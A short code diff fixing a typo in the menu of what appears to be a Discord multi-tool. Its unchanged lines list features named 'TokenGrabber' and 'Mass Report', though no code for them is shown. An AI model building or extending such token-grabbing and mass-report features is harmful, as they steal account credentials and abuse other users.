@@ -30,7 +30,7 @@ class Client:
             "5" : {"function" : historyClear.clear, "name" : "HistoryClear"},
             "6" : {"function" : bumper.bumper, "name" : "AutoBump"},
             "7" : {"function" : grabber.create_grabber, "name" : "TokenGrabber"},
-            "8" : {"function" : memer.start, "name" : "Dank memer gridner"},
+            "8" : {"function" : memer.start, "name" : "Dank memer grinder"},
             "9" : {"function" : serverLookup.fetch_data, "name" : "Server Lookup"},
             "10" : {"function" : massReport.start, "name" : "Mass Report"},
             "11" : {"function" : credits.show_credits, "name" : "Credits"},
